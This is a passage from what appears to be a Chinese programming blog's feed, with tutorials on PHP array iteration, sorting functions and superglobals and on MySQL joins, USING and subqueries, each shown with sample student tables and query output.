class="comment">//遍历关联数组</span></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$age</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$x_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Key=&quot;</span> . <span class="variable">$x</span> . <span class="string">&quot;, Value=&quot;</span> . <span class="variable">$x_value</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="PHP-数组排序函数"><a href="#PHP-数组排序函数" class="headerlink" title="PHP - 数组排序函数"></a>PHP - 数组排序函数</h1><p>sort() - 对数组进行升序排列</p>
<p>rsort() - 对数组进行降序排列</p>
<p>asort() - 根据关联数组的值，对数组进行升序排列</p>
<p>ksort() - 根据关联数组的键，对数组进行升序排列</p>
<p>arsort() - 根据关联数组的值，对数组进行降序排列</p>
<p>krsort() - 根据关联数组的键，对数组进行降序排列</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sort()</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$cars</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$clength</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$clength</span>;<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="variable">$x</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//rsort()   </span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">rsort</span>(<span class="variable">$cars</span>);   </span><br><span class="line"></span><br><span class="line"><span class="comment">//asort() arsort() 关联数组排序 value</span></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">asort</span>(<span class="variable">$age</span>);</span><br><span class="line"><span class="title function_ invoke__">arsort</span>(<span class="variable">$age</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ksort() krsort() 关联数组排序 key</span></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">ksort</span>(<span class="variable">$age</span>);</span><br><span class="line"><span class="title function_ invoke__">krsort</span>(<span class="variable">$age</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h1><p>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。</p>
<p>$GLOBALS</p>
<p>$_SERVER</p>
<p>$_REQUEST</p>
<p>$_POST</p>
<p>$_GET</p>
<p>$_COOKIE</p>
<p>$_FILES</p>
<p>$_ENV</p>
<p>$_SESSION</p>
]]></content>
  </entry>
  <entry>
    <title>MYSQL数据库基础4</title>
    <url>/2023/04/23/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%804/</url>
    <content><![CDATA[<h2 id="1-2-多表查询"><a href="#1-2-多表查询" class="headerlink" title="1.2  多表查询"></a>1.2  多表查询</h2><h4 id="1-2-1-内连接"><a href="#1-2-1-内连接" class="headerlink" title="1.2.1  内连接"></a>1.2.1  内连接</h4><p>规则：返回两个表的公共记录</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 语法一</span><br><span class="line">select * from 表1 inner join 表2 on 表1.公共字段=表2.公共字段</span><br><span class="line">-- 语法二</span><br><span class="line">select * from 表1，表2 where 表1.公共字段=表2.公共字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- inner join</span><br><span class="line">mysql&gt; select * from stuinfo inner join stumarks on stuinfo.stuno=stumarks.stuno;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | examNo  | stuNo  | writtenExam | labExam |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           | s271811 | s25303 |          80 |      58 |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          | s271813 | s25302 |          50 |      90 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | s271815 | s25304 |          65 |      50 |</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           | s271816 | s25301 |          77 |      82 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           | s271819 | s25318 |          56 |      48 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 相同的字段只显示一次</span><br><span class="line">mysql&gt; select s.stuno,stuname,stusex,writtenexam,labexam from stuinfo s inner join stumarks m on s.stuno=m.stuno;</span><br><span class="line">+--------+----------+--------+-------------+---------+</span><br><span class="line">| stuno  | stuname  | stusex | writtenexam | labexam |</span><br><span class="line">+--------+----------+--------+-------------+---------+</span><br><span class="line">| s25303 | 李斯文        | 女      |          80 |      58 |</span><br><span class="line">| s25302 | 李文才        | 男       |          50 |      90 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |          65 |      50 |</span><br><span class="line">| s25301 | 张秋丽         | 男       |          77 |      82 |</span><br><span class="line">| s25318 | 争青小子        | 男       |          56 |      48 |</span><br><span class="line">+--------+----------+--------+-------------+---------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 使用where</span><br><span class="line">mysql&gt; select * from stuinfo,stumarks where stuinfo.stuno=stumarks.stuno;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | examNo  | stuNo  | writtenExam | labExam |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           | s271811 | s25303 |          80 |      58 |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          | s271813 | s25302 |          50 |      90 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | s271815 | s25304 |          65 |      50 |</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           | s271816 | s25301 |          77 |      82 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           | s271819 | s25318 |          56 |      48 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>多学一招：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 1、内连接中inner可以省略</span><br><span class="line">select * from 表1  join 表2 on 表1.公共字段=表2.公共字段</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stuinfo join stumarks on stuinfo.stuno=stumarks.stuno;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | examNo  | stuNo  | writtenExam | labExam |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           | s271811 | s25303 |          80 |      58 |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          | s271813 | s25302 |          50 |      90 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | s271815 | s25304 |          65 |      50 |</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           | s271816 | s25301 |          77 |      82 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           | s271819 | s25318 |          56 |      48 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 如何实现三表查询</span><br><span class="line">select * from 表1 inner join 表2 on 表1.公共字段=表2.公共字段 inner join 表3 on 表2.公共字段=表3.公共字段</span><br><span class="line"></span><br><span class="line">-- 表连接越多，效率越低</span><br></pre></td></tr></table></figure>

<p>思考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表1 inner join 表2 on 表1.公共字段=表2.公共字段</span><br><span class="line">和</span><br><span class="line">select * from 表2 inner join 表1 on 表1.公共字段=表2.公共字段   一样吗？</span><br><span class="line"></span><br><span class="line">答：一样的</span><br></pre></td></tr></table></figure>



<h4 id="1-2-2-左外连接"><a href="#1-2-2-左外连接" class="headerlink" title="1.2.2  左外连接"></a>1.2.2  左外连接</h4><p>规则：以左边的表为准，右边如果没有对应的记录用null显示</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表1 left join 表2 on 表1.公共字段=表2.公共字段</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select stuname,writtenexam,labexam from stuinfo left join stumarks on stuinfo.stuno=stumarks.stuno;</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| stuname  | writtenexam | labexam |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| 张秋丽         |          77 |      82 |</span><br><span class="line">| 李文才        |          50 |      90 |</span><br><span class="line">| 李斯文        |          80 |      58 |</span><br><span class="line">| 欧阳俊雄        |          65 |      50 |</span><br><span class="line">| 诸葛丽丽         |        NULL |    NULL |</span><br><span class="line">| 争青小子        |          56 |      48 |</span><br><span class="line">| 梅超风        |        NULL |    NULL |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">7 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>思考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表1 left join 表2 on 表1.公共字段=表2.公共字段</span><br><span class="line">和</span><br><span class="line">select * from 表2 left join 表1 on 表1.公共字段=表2.公共字段   一样吗？</span><br><span class="line"></span><br><span class="line">答：不一样，第一个SQL以表1为准，第二个SQL以表2为准。</span><br></pre></td></tr></table></figure>



<h4 id="1-2-3-右外连接"><a href="#1-2-3-右外连接" class="headerlink" title="1.2.3  右外连接"></a>1.2.3  右外连接</h4><p>规则：以右边的表为准，左边如果没有对应的记录用null显示</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表1 right join 表2 on 表1.公共字段=表2.公共字段</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select stuname,writtenexam,labexam from stuinfo right join stumarks on stuinfo.stuno=stumarks.stuno;</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| stuname  | writtenexam | labexam |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">| 李斯文        |          80 |      58 |</span><br><span class="line">| 李文才        |          50 |      90 |</span><br><span class="line">| 欧阳俊雄        |          65 |      50 |</span><br><span class="line">| 张秋丽         |          77 |      82 |</span><br><span class="line">| 争青小子        |          56 |      48 |</span><br><span class="line">| NULL     |          66 |      77 |</span><br><span class="line">+----------+-------------+---------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>思考</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表1 left join 表2 on 表1.公共字段=表2.公共字段</span><br><span class="line">和</span><br><span class="line">select * from 表2 right join 表1 on 表1.公共字段=表2.公共字段   一样吗？</span><br><span class="line"></span><br><span class="line">答：一样</span><br></pre></td></tr></table></figure>



<h4 id="1-2-4-交叉连接"><a href="#1-2-4-交叉连接" class="headerlink" title="1.2.4  交叉连接"></a>1.2.4  交叉连接</h4><p>语法，返回笛卡尔积</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表1 cross join 表2</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 交叉连接</span><br><span class="line">mysql&gt; select * from stuinfo cross join stumarks;</span><br><span class="line"></span><br><span class="line">-- 交叉连接有连接表达式与内连接是一样的</span><br><span class="line">mysql&gt; select * from stuinfo cross join stumarks on stuinfo.stuno=stumarks.stuno;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | examNo  | stuNo  | writtenExam | labExam |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           | s271811 | s25303 |          80 |      58 |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          | s271813 | s25302 |          50 |      90 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | s271815 | s25304 |          65 |      50 |</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           | s271816 | s25301 |          77 |      82 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           | s271819 | s25318 |          56 |      48 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+--------+-------------+---------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结</p>
<p>1、交叉连接如果没有连接条件返回笛卡尔积</p>
<p>2、如果有连接条件和内连接是一样的。</p>
<h4 id="1-2-5-自然连接"><a href="#1-2-5-自然连接" class="headerlink" title="1.2.5  自然连接"></a>1.2.5  自然连接</h4><p>自动判断条件连接，判断的条件是依据同名字段</p>
<p>1、自然内连接（natural join）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from stuinfo natural join stumarks;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | examNo  | writtenExam | labExam |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           | s271811 |          80 |      58 |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          | s271813 |          50 |      90 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | s271815 |          65 |      50 |</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           | s271816 |          77 |      82 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           | s271819 |          56 |      48 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>2、自然左外连接（natural left join）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from stuinfo natural left join stumarks;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | examNo  | writtenExam | labExam |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           | s271816 |          77 |      82 |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          | s271813 |          50 |      90 |</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           | s271811 |          80 |      58 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | s271815 |          65 |      50 |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           | NULL    |        NULL |    NULL |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           | s271819 |          56 |      48 |</span><br><span class="line">| s25319 | 梅超风        | 女      |     23 |       5 | 河北          | NULL    |        NULL |    NULL |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>3、自然右外连接（natural right join）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from stuinfo natural right join stumarks;</span><br><span class="line">+--------+---------+-------------+---------+----------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | examNo  | writtenExam | labExam | stuName  | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+---------+-------------+---------+----------+--------+--------+---------+------------+</span><br><span class="line">| s25303 | s271811 |          80 |      58 | 李斯文        | 女      |     22 |       2 | 北京           |</span><br><span class="line">| s25302 | s271813 |          50 |      90 | 李文才        | 男       |     31 |       3 | 上海          |</span><br><span class="line">| s25304 | s271815 |          65 |      50 | 欧阳俊雄        | 男       |     28 |       4 | 天津           |</span><br><span class="line">| s25301 | s271816 |          77 |      82 | 张秋丽         | 男       |     18 |       1 | 北京           |</span><br><span class="line">| s25318 | s271819 |          56 |      48 | 争青小子        | 男       |     26 |       6 | 天津           |</span><br><span class="line">| s25320 | s271820 |          66 |      77 | NULL     | NULL   |   NULL |    NULL | NULL       |</span><br><span class="line">+--------+---------+-------------+---------+----------+--------+--------+---------+------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、表连接是通过同名字段来连接的</p>
<p>2、如果没有同名字段就返回笛卡尔积</p>
<p>3、同名的连接字段只显示一个，并且将该字段放在最前面</p>
<h4 id="1-2-6-using"><a href="#1-2-6-using" class="headerlink" title="1.2.6  using"></a>1.2.6  using</h4><p>using用来指定连接字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from stuinfo inner join stumarks using(stuno);</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | examNo  | writtenExam | labExam |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           | s271811 |          80 |      58 |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          | s271813 |          50 |      90 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | s271815 |          65 |      50 |</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           | s271816 |          77 |      82 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           | s271819 |          56 |      48 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+---------+-------------+---------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>using的结果也会对公共字段进行优化，优化的规则和自然连接是一样的；</p>
<h4 id="1-2-7-练习"><a href="#1-2-7-练习" class="headerlink" title="1.2.7  练习"></a>1.2.7  练习</h4><p>1、显示地区及每个地区参加笔试的人数，并按人数降序排列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 第一步： 显示地区及每个地区参加笔试的人数</span><br><span class="line">mysql&gt; select stuaddress,count(writtenexam) from stuinfo left join stumarks using(stuno) group by stuaddress;</span><br><span class="line">+------------+--------------------+</span><br><span class="line">| stuaddress | count(writtenexam) |</span><br><span class="line">+------------+--------------------+</span><br><span class="line">| 上海          |                  1 |</span><br><span class="line">| 北京           |                  2 |</span><br><span class="line">| 天津           |                  2 |</span><br><span class="line">| 河北          |                  0 |</span><br><span class="line">| 河南           |                  0 |</span><br><span class="line">+------------+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 第二步：将结果降序排列</span><br><span class="line">mysql&gt; select stuaddress,count(writtenexam) c from stuinfo left join stumarks using(stuno) group by stuaddress order by c desc;</span><br><span class="line">+------------+---+</span><br><span class="line">| stuaddress | c |</span><br><span class="line">+------------+---+</span><br><span class="line">| 北京           | 2 |</span><br><span class="line">| 天津           | 2 |</span><br><span class="line">| 上海          | 1 |</span><br><span class="line">| 河北          | 0 |</span><br><span class="line">| 河南           | 0 |</span><br><span class="line">+------------+---+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>2、显示有学生参加考试的地区</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- having筛选</span><br><span class="line">mysql&gt; select stuaddress,count(writtenexam) c from stuinfo left join stumarks using(stuno) group by stuaddress having c&gt;0;</span><br><span class="line">+------------+---+</span><br><span class="line">| stuaddress | c |</span><br><span class="line">+------------+---+</span><br><span class="line">| 上海          | 1 |</span><br><span class="line">| 北京           | 2 |</span><br><span class="line">| 天津           | 2 |</span><br><span class="line">+------------+---+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 表连接实现</span><br><span class="line">-- 第一步：右连接获取有成绩的地区</span><br><span class="line">mysql&gt; select stuaddress from stuinfo right join stumarks using(stuno);</span><br><span class="line">+------------+</span><br><span class="line">| stuaddress |</span><br><span class="line">+------------+</span><br><span class="line">| 北京           |</span><br><span class="line">| 上海          |</span><br><span class="line">| 天津           |</span><br><span class="line">| 北京           |</span><br><span class="line">| 天津           |</span><br><span class="line">| NULL       |</span><br><span class="line">+------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line">-- 第二步：去重复</span><br><span class="line">mysql&gt; select distinct stuaddress from stuinfo right join stumarks using(stuno);</span><br><span class="line">+------------+</span><br><span class="line">| stuaddress |</span><br><span class="line">+------------+</span><br><span class="line">| 北京           |</span><br><span class="line">| 上海          |</span><br><span class="line">| 天津           |</span><br><span class="line">| NULL       |</span><br><span class="line">+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 去除null</span><br><span class="line">mysql&gt; select distinct stuaddress from stuinfo right join stumarks using(stuno) having stuaddress is not null;</span><br><span class="line">+------------+</span><br><span class="line">| stuaddress |</span><br><span class="line">+------------+</span><br><span class="line">| 北京           |</span><br><span class="line">| 上海          |</span><br><span class="line">| 天津           |</span><br><span class="line">+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>3、显示男生和女生的人数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 方法一： 分组查询</span><br><span class="line">mysql&gt; select stusex,count(*) from stuinfo group by stusex;</span><br><span class="line">+--------+----------+</span><br><span class="line">| stusex | count(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 女      |        3 |</span><br><span class="line">| 男       |        4 |</span><br><span class="line">+--------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 方法二： union</span><br><span class="line">mysql&gt; select stusex,count(*) from stuinfo where stusex=&#x27;男&#x27; union select stusex,count(*) from stuinfo where stusex=&#x27;女&#x27;;</span><br><span class="line">+--------+----------+</span><br><span class="line">| stusex | count(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 男       |        4 |</span><br><span class="line">| 女      |        3 |</span><br><span class="line">+--------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 方法三：直接写条件</span><br><span class="line"></span><br><span class="line">mysql&gt; select sum(stusex=&#x27;男&#x27;) 男,sum(stusex=&#x27;女&#x27;) 女 from stuinfo;</span><br><span class="line">+------+------+</span><br><span class="line">| 男     | 女    |</span><br><span class="line">+------+------+</span><br><span class="line">|    4 |    3 |</span><br><span class="line">+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>4、显示每个地区男生、女生、总人数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select stuaddress,count(*) 总人数,sum(stusex=&#x27;男&#x27;) 男,sum(stusex=&#x27;女&#x27;) 女 from stuinfo group by stuaddress;</span><br><span class="line">+------------+--------+------+------+</span><br><span class="line">| stuaddress | 总人数       | 男     | 女    |</span><br><span class="line">+------------+--------+------+------+</span><br><span class="line">| 上海          |      1 |    1 |    0 |</span><br><span class="line">| 北京           |      2 |    1 |    1 |</span><br><span class="line">| 天津           |      2 |    2 |    0 |</span><br><span class="line">| 河北          |      1 |    0 |    1 |</span><br><span class="line">| 河南           |      1 |    0 |    1 |</span><br><span class="line">+------------+--------+------+------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h2 id="1-3-子查询"><a href="#1-3-子查询" class="headerlink" title="1.3  子查询"></a>1.3  子查询</h2><p>语法：select * from 表1 where （子查询）</p>
<p>外面的查询称为父查询</p>
<p>子查询为父查询提供查询条件</p>
<h4 id="1-3-1-标量子查询"><a href="#1-3-1-标量子查询" class="headerlink" title="1.3.1  标量子查询"></a>1.3.1  标量子查询</h4><p>特点：子查询返回的值是一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查找笔试成绩是80的学生</span><br><span class="line">mysql&gt; select * from stuinfo where stuno=(select stuno from stumarks where writtenexam=80);</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 查找最高分的学生</span><br><span class="line">-- 方法一</span><br><span class="line">mysql&gt; select * from stuinfo where stuno=(select stuno from stumarks order by writtenexam desc limit 1);</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 方法二：</span><br><span class="line">mysql&gt; select * from stuinfo where stuno=(select stuno from stumarks where writtenexam=(select max(writtenexam) from stumarks))</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-3-2-列子查询"><a href="#1-3-2-列子查询" class="headerlink" title="1.3.2  列子查询"></a>1.3.2  列子查询</h4><p>特点： 子查询返回的结果是一列</p>
<p>如果子查询的结果返回多条记录，不能使用等于，用in或not in</p>
